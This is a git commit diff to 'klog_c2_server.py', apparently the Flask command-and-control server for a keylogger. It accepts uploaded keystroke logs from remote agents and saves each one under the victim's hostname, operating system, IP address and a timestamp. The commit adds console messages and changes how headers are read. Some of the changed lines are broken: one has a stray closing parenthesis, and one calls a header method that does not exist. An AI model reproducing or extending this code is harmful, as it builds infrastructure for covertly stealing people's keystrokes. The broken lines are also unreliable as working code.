108523d315f927a3603243c60c42443f3b1072b8
Dr0og <127545925+Dr0og@users.noreply.github.com>
2024-01-19 20:14:41 -0500

    Update klog_c2_server.py
    Made Suggest changes from previous Pull request in Main repo

--- klog_c2_server.py
+++ klog_c2_server.py
@@ -1,5 +1,6 @@
 import os
 import base64
+import sys
 from datetime import datetime
 from flask import Flask, flash,request, redirect, url_for
 from werkzeug.utils import secure_filename
@@ -13,11 +14,17 @@ klog_server.config['KLOG_UPLOAD_DIR'] = KLOG_UPLOAD_DIR
 def klog_collect():
 	if request.method == 'POST':
 		klog_file =  request.files["bbe02f946d5455d74616fc9777557c22"]
-		header_list = request.headers.__getitem__('Sn')
-		getid_headers = base64.b64decode(request.headers.__getitem__('Nn')) + b'_' + base64.b64decode(request.headers.__getitem__('Sn'))
+		getid_headers = base64.b64decode(request.headers.get('Nn')) + b'_' + base64.b64decode(request.headers.getitem('Sn'))
+		##Filename format is as follows <hostname>_<OS>_<remote_addr>_<timestamp>
+		##hostname/OS are both from the agents http headers
+		##Remote Addr is logged from what flask recives from the request obj
+		##Timestamp is YY-MM-DDThh:mm:ss:
 		filename = getid_headers + b'_'+ bytes(request.remote_addr, encoding='utf-8') + b'_' +bytes(datetime.now().isoformat(timespec='seconds'), encoding='utf-8')
 		out = klog_file.save(KLOG_UPLOAD_DIR + filename.decode('utf-8'))
 		if(out == None):
+			sys.stdout.write("\n[*]C2 Request Successful!\n"))
 			return "[*]C2 Request Successful!"
 		elif(out !=  None):
+			sys.stdout.write("\n[*]C2 Request Error! Traceback to follow\n")
+			print(sys.exc_info()[2]) ##Contains Error info for running process
 			return "[*]C2 Request Error!"
